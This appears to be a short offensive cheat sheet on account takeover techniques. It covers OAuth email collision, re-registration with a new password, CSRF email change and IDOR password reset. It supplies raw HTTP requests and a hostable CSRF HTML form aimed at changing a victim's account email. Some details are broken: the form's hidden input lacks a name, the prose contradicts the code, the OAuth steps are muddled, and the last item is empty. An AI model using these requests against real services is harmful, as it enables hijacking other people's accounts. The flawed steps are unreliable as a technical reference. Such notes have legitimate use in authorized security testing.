# Account Takeover

## Introduction
Account Takeover (known as ATO) is a type of identity theft where a bad actor gains unauthorized access to an account belonging to someone else.

## How to exploit
1. Using OAuth Misconfiguration
   - Victim has a account in evil.com
   - Attacker creates an account on evil.com using OAuth. For example the attacker have a facebook with a registered victim email
   - Attacker changed his/her email to victim email.
   - When the victim try to create an account on evil.com, it says the email already exists.

2. Try re-sign up using same email
   ```
   POST /newaccount
   [...]
   email=victim@mail.com&password=1234
   ```
   After sign up using victim email, try signup again but using different password
   ```
   POST /newaccount
   [...]
   email=victim@mail.com&password=hacked
   ```

3. via CSRF
   - Create an account as an attacker and fill all the form, check your info in the Account Detail.
   - Change the email and capture the request, then created a CSRF Exploit.
   - The CSRF Exploit looks like as given below. I have replaced the email value to anyemail@*******.com and submitted a request in the victim’s account.

   ```html
   <html>
   <body>
      <form action="https://evil.com/user/change-email" method="POST">
         <input type="hidden" value="victim@gmail.com"/>
         <input type="submit" value="Submit Request">
      </form>
   </body>
   </html>
   ```

4. Chaining with IDOR, for example
   ```
   POST /changepassword.php
   Host: site.com
   [...]
   userid=500&password=heked123
   ```
   500 is an attacker ID and 501 is a victim ID, so we change the userid from attacker to victim ID

5. No Rate Limit on 2FA
